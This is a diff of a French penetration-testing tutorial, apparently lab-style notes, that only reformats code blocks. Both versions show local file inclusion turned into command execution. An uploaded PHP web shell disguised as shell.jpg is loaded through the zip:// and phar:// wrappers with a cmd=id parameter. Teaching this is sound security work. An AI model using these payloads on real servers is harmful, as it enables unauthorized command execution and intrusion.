@@ -85,11 +85,8 @@ Si l'approche précédente ne fonctionne pas, vous pouvez utiliser le wrapper **
 1. Téléchargez le fichier ZIP (`shell.jpg`).
 2.  Incluez le fichier avec le wrapper **zip://** en précisant le chemin interne du fichier compressé (`#shell.php`) :
 
-    {% code overflow="wrap" fullWidth="true" %}
-    ```bash
-    http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
-    ```
-    {% endcode %}
+    <pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash">http://&#x3C;SERVER_IP>:&#x3C;PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&#x26;cmd=id
+    </code></pre>
 3. Résultat attendu : Commande exécutée avec succès.
 
 ***
@@ -121,11 +118,8 @@ Le wrapper **phar** peut également être utilisé pour exécuter du code malvei
 1. Téléchargez le fichier PHAR (`shell.jpg`).
 2.  Incluez-le avec le wrapper **phar://** :
 
-    {% code overflow="wrap" fullWidth="true" %}
-    ```bash
-    http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
-    ```
-    {% endcode %}
+    <pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash">http://&#x3C;SERVER_IP>:&#x3C;PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&#x26;cmd=id
+    </code></pre>
 3. Résultat attendu : Commande exécutée avec succès.
 
 ***
